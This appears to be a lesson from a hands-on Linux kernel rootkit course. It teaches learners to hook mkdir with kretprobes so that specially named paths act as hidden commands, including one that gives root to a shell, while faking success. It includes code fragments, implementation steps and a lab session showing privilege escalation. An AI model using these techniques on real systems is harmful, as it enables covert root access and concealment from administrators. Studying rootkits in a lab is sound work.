# L09: Dispatch Commands and Control the Return Value

L08 uses a kprobe.
It fires before the function runs, so you can read arguments and take action,
but you cannot control the return value.
The real `mkdir` still returns `ENOENT`, even when the action succeeded.

This exercise pairs an entry handler with a return handler so recognized
commands return their handler result without creating a directory.

## What you will observe

```console
root@victim:~# mkdir /tmp/rklings.ping
root@victim:~# echo $?
0
root@victim:~# test ! -e /tmp/rklings.ping && echo absent
absent
root@victim:~# dmesg | tail -1
rklings: dispatch: cmd=ping
```

The command reports success, while the requested directory remains absent.

## Workspace

`main.c` already contains the PID lookup and credential replacement from L07.
You will add the handlers, command table, dispatcher, two kretprobes, and their
lifecycle.

Read the complete entry-to-return path before implementing the TODOs.

## Kretprobe: entry + return

A kretprobe fires two handlers as a matched pair.
The entry handler runs before the function, the return handler runs after.
Between them, you store state in per-instance data.

```text
mkdir("rklings.ping")
          |
          v
+----------------------------------------------+
| kretprobe entry handler                      |
|                                              |
| 1. copy and parse pathname                   |
| 2. run ping handler                          |
| 3. save result=0 and intercepted=true        |
| 4. replace first pathname byte with '\0'     |
+----------------------+-----------------------+
                       |
                       v
+----------------------------------------------+
| __x64_sys_mkdir runs with an empty pathname  |
| internal result: -ENOENT                     |
+----------------------+-----------------------+
                       |
                       v
+----------------------------------------------+
| kretprobe return handler                     |
| replace -ENOENT with saved result 0          |
+----------------------+-----------------------+
                       |
                       v
             userspace receives 0
```

Both handlers receive a `struct kretprobe_instance *ri` as their first argument.
`ri->data` is storage belonging to that one active function call.
Its size comes from `.data_size`.
This keeps simultaneous `mkdir` calls from overwriting one another:

```text
call on CPU 0                         call on CPU 1
+----------------------+              +----------------------+
| ri->data             |              | ri->data             |
| result = 0           |              | result = -EINVAL     |
| intercepted = true   |              | intercepted = true   |
+----------------------+              +----------------------+
```

Define that per-call state explicitly:

```c
struct rk_mkdir_data {
    int result;
    bool intercepted;
};

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler  = rk_mkdir_entry,
    .handler        = rk_mkdir_return,
    .data_size      = sizeof(struct rk_mkdir_data),
    .maxactive      = 8,
};
```

`.maxactive` limits the number of calls for which kretprobe can retain return
state at once.
This exercise uses eight slots.

## Command table

Instead of a chain of strcmp calls, use a table:

```c
struct rk_cmd_entry {
    const char *key;
    int (*handler)(const char *arg);
};

static const struct rk_cmd_entry cmd_table[] = {
    { "e",      rk_cmd_escalate },
    { "ping",   rk_cmd_ping },
    { "status", rk_cmd_status },
};
```

The dispatcher skips the `rklings.` prefix, splits on the first dot, and
searches the table by exact command length and bytes:

```text
rklings.ping        -> cmd="ping",   arg=NULL
rklings.e           -> cmd="e",      arg=NULL
rklings.e.1234      -> cmd="e",      arg="1234"
```

Length comparison prevents `e` from accidentally matching `extra`.
An unknown command returns `-ENOENT`.

The handlers have one common signature:

```c
typedef int (*rk_handler_t)(const char *arg);
```

`ping` and `status` ignore `arg`. `e` uses no argument for the parent shell and
parses a decimal PID when an argument is present.
The supplied escalation count is atomic because handlers may run concurrently on
different CPUs.

## Failure to avoid

A kprobe pre-handler and a kretprobe entry handler interpret their return values
differently:

```text
kprobe pre-handler       0 = resume normal instruction flow
kretprobe entry handler  0 = track this call and run its return handler
kretprobe entry handler != 0 = do not track this call
```

Also: `regs_set_return_value` takes an `unsigned long`.
Cast your int result through `(unsigned long)(long)` to preserve negative
errnos.

## Implement it

Complete the TODOs in this order:

1. Implement `ping`, `status`, and `e` handlers.
2. Define `rk_cmd_entry`, the command table, and `rk_dispatch`.
3. Split the suffix on its first dot and require an exact command match.
4. Define per-instance `result` and `intercepted` state.
5. In the shared entry path, copy the pathname and ignore ordinary names.
6. Dispatch recognized prefixes, save the result, and null the pathname.
7. Recover `di` for `mkdir` and `si` for `mkdirat` from inner registers.
8. In the return handler, replace the syscall result only when intercepted.
9. Declare, register, roll back, and unregister both kretprobes.

Cast the signed handler result through `long` before converting it to the
unsigned register type:

```c
regs_set_return_value(regs, (unsigned long)(long)data->result);
```

That conversion preserves negative error values.

## Test it

```console
$ ./rklings run L09
root@victim:~# insmod /rklings/rklings.ko
root@victim:~# mkdir /tmp/rklings.ping
root@victim:~# echo $?
0
root@victim:~# test ! -e /tmp/rklings.ping && echo absent
absent
root@victim:~# dmesg | tail -1
rklings: dispatch: cmd=ping
root@victim:~# mkdir /tmp/rklings.status
root@victim:~# dmesg | tail -1
rklings: alive, escalations=0
root@victim:~# su student
student@victim:/root$ mkdir /tmp/rklings.e
student@victim:/root$ id
uid=0(root) gid=0(root) groups=0(root)
```

`mkdir rklings.ping` returns exit code 0. In L08 it returned ENOENT.
The kretprobe return handler overrode the syscall return value.

## Validate

```console
$ ./rklings validate L09
```

The checks exercise `ping`, `status`, parent-shell escalation, successful return
replacement, absence of the requested directory, unknown-command stability, and
module unload.

## Next

The module can now route multiple hidden commands.
M00 keeps it available after reboot and removes it from the normal module list;
L10 then adds the list of specific items you want concealed.
